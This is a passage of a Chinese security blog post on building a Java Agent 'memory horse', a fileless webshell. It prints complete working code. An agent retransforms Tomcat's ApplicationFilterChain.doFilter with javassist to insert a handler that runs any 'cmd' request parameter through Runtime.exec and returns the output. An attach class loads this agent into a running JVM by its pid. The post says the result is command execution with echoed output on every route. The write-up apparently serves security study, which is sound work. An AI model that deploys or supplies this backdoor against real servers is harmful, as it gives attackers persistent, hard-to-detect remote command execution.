class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注释写的很清楚，不再解释，运行看结果</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/12.png" class>
+
+<p>修改字节码成功。</p>
+<h3 id="构造恶意Agent"><a href="#构造恶意Agent" class="headerlink" title="构造恶意Agent"></a>构造恶意Agent</h3><p>我们需要修改 ApplicationFilterChain 的 doFilter方法，编写Agent主类，引用木头师傅的代码</p>
+<p>遍历加载的Class，然后对目标Class进行重定义</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation ins)</span> &#123;</span><br><span class="line">        ins.addTransformer(<span class="keyword">new</span> <span class="title class_">DefineTransformer</span>(),<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// 获取所有已加载的类</span></span><br><span class="line">        Class[] classes = ins.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    ins.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后编写 DefineTransformer.java</p>
+<p>对拦截到的类进行if判断，如果类名是 ApplicationFilterChain 就获取doFilter方法，对其内容进行修改，利用 insertBefore 方法，将恶意代码插入到前面</p>
+<p>首先分析一下有回显的恶意代码</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/13.png" class>
+
+<p>获取到request和response两个对象，接收cmd参数，使用exec方法命令执行，getInputStream() 方法用于获取命令的标准输出流，然后利用 BufferedReader 类将输出流转换为字符流，最后将数据写入响应里，返回给客户端。</p>
+<p>完整代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Attack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DefineTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(className.equals(ClassName))&#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> classPool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    ctMethod.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  request;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;javax.servlet.http.HttpServletResponse res = response;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                            <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">                        ctClass.detach();</span><br><span class="line">                        <span class="keyword">return</span> bytes;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (CannotCompileException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NotFoundException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后编译成jar包</p>
+<h3 id="编写注入类"><a href="#编写注入类" class="headerlink" title="编写注入类"></a>编写注入类</h3><p>利用上文说的启动后加载的方式将Agent马注入到正在运行的JVM中，获取运行中JVM 的pid</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/14.png" class>
+
+<p>编写代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentCommand</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">target</span> <span class="operator">=</span> VirtualMachine.attach(<span class="string">&quot;98736&quot;</span>);</span><br><span class="line">        target.loadAgent(<span class="string">&quot;D:\\javaweb\\java安全\\java-agentShell\\javaAgentTest\\out\\production\\java-agent.jar&quot;</span>);</span><br><span class="line">        target.detach();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行代码</p>
+<img src="/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/15.png" class>
+
+<p>任何路由下都是有回显的命令执行</p>
+<p>不过这里有一个小坑，我们是要将agent的jar包加载到正在运行的springboot中，transform方法利用 javassist 字节码编程修改 doFilter 方法，如果springboot没有导入javassist 的maven项目是无法修改成功的，这里当时困扰了我很久，所以在运行前需要导入 javassist 的包才行。</p>
+<p>本片文章主要认识了什么是java agent以及agent内存马的构造思路，至于如何注入内存马，上几篇文章都是通过编写JSP，上传JSP文件来注入内存马，实际上，JSP文件也相当于一个Servlet，在tomcat中也会编译成class文件，并不算真正意义上的无文件木马，所以通常情况下是通过反序列化来注入内存马</p>
+<p>后续我会继续分析反序列化注入内存马的思路与细节</p>
+<p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/nice0e3/p/14086165.html#0x00-%E5%89%8D%E8%A8%80">https://www.cnblogs.com/nice0e3/p/14086165.html#0x00-%E5%89%8D%E8%A8%80</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9450#toc-16">https://xz.aliyun.com/t/9450#toc-16</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#863a8583">https://www.yuque.com/tianxiadamutou/zcfd4v/tdvszq#863a8583</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/">https://xilitter.github.io/2023/08/30/%E5%88%9D%E8%AF%86Java-Agent%E5%86%85%E5%AD%98%E9%A9%AC/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/">内存马</a></div><div class="post_share"><div class="social-share" data-image="/img/art03.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/04/%E7%BB%93%E5%90%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="结合反序列化注入tomcat内存马"><img class="cover" src="/img/art/a3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">结合反序列化注入tomcat内存马</div></div></a></div><div class="next-post pull-right"><a href="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Valve内存马"><img class="cover" src="/img/art03.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">java内存马连续剧——Valve内存马</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img class="cover" src="/img/art/a2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">0ctf-2021 buggyLoader题目复现</div></div></a></div><div><a href="/2023/09/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E6%B5%85%E6%9E%90/" title="Spring内存马浅析"><img class="cover" src="/img/art03.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-13</div><div class="title">Spring内存马浅析</div></div></a></div><div><a href="/2023/08/19/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Listener%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Listener内存马"><img class="cover" src="/img/art03.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-19</div><div class="title">java内存马连续剧——Listener内存马</div></div></a></div><div><a href="/2023/08/16/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Filter%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Filter内存马"><img class="cover" src="/img/art03.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-16</div><div class="title">java内存马连续剧——Filter内存马</div></div></a></div><div><a href="/2023/08/26/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Servlet%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Servlet内存马"><img class="cover" src="/img/art03.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-26</div><div class="title">java内存马连续剧——Servlet内存马</div></div></a></div><div><a href="/2023/08/27/java%E5%86%85%E5%AD%98%E9%A9%AC%E8%BF%9E%E7%BB%AD%E5%89%A7%E2%80%94%E2%80%94Valve%E5%86%85%E5%AD%98%E9%A9%AC/" title="java内存马连续剧——Valve内存马"><img class="cover" src="/img/art03.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-08-27</div><div class="title">java内存马连续剧——Valve内存马</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E8%AE%A4%E8%AF%86Java-Agent"><span class="toc-number">1.</span> <span class="toc-text">0x01 认识Java Agent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E5%89%8D%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.1.</span> <span class="toc-text">启动前加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Instrumentation"><span class="toc-number">1.1.1.</span> <span class="toc-text">Instrumentation</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E8%BE%91manifest-mf%E6%96%87%E4%BB%B6"><span class="toc-number">1.1.2.</span> <span class="toc-text">编辑manifest.mf文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.1.3.</span> <span class="toc-text">测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E5%90%8E%E5%8A%A0%E8%BD%BD"><span class="toc-number">1.2.</span> <span class="toc-text">启动后加载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#VirtualMachine"><span class="toc-number">1.2.1.</span> <span class="toc-text">VirtualMachine</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Agent%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">0x02 Agent内存马分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E5%85%B3%E9%94%AE%E6%96%B9%E6%B3%95%E4%BF%AE%E6%94%B9"><span class="toc-number">2.1.</span> <span class="toc-text">寻找关键方法修改</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javassist"><span class="toc-number">2.2.</span> <span class="toc-text">javassist</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ClassPool"><span class="toc-number">2.2.1.</span> <span class="toc-text">ClassPool</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CtClass"><span class="toc-number">2.2.2.</span> <span class="toc-text">CtClass</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BE%E4%B8%AA%E4%BE%8B%E5%AD%90"><span class="toc-number">2.2.3.</span> <span class="toc-text">举个例子</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0%E6%81%B6%E6%84%8FAgent"><span class="toc-number">2.3.</span> <span class="toc-text">构造恶意Agent</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E7%B1%BB"><span class="toc-number">2.4.</span> <span class="toc-text">编写注入类</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JDBC反序列化漏洞分析"/></a><div class="content"><a class="title" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析">JDBC反序列化漏洞分析</a><time datetime="2023-11-10T08:44:29.000Z" title="发表于 2023-11-10 16:44:29">2023-11-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Nagini 打靶记录"><img src="/img/art/a7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nagini 打靶记录"/></a><div class="content"><a class="title" href="/2023/11/08/Nagini-%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Nagini 打靶记录">Nagini 打靶记录</a><time datetime="2023-11-08T14:03:45.000Z" title="发表于 2023-11-08 22:03:45">2023-11-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img src="/img/art/a2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="0ctf-2021 buggyLoader题目复现"/></a><div class="content"><a class="title" href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现">0ctf-2021 buggyLoader题目复现</a><time datetime="2023-11-02T12:34:36.000Z" title="发表于 2023-11-02 20:34:36">2023-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="thinkphp 5.1 rce流程分析"><img src="/img/art/a5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thinkphp 5.1 rce流程分析"/></a><div class="content"><a class="title" href="/2023/10/30/thinkphp-5-1-rce%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" title="thinkphp 5.1 rce流程分析">thinkphp 5.1 rce流程分析</a><time datetime="2023-10-30T09:15:14.000Z" title="发表于 2023-10-30 17:15:14">2023-10-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/" title="thinkphp 5.0.23 RCE分析"><img src="/img/art/a4.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thinkphp 5.0.23 RCE分析"/></a><div class="content"><a class="title" href="/2023/10/27/thinkphp-5-0-23-RCE%E5%88%86%E6%9E%90/" title="thinkphp 5.0.23 RCE分析">thinkphp 5.0.23 RCE分析</a><time datetime="2023-10-27T13:04:32.000Z" title="发表于 2023-10-27 21:04:32">2023-10-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art03.png')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></body></html>
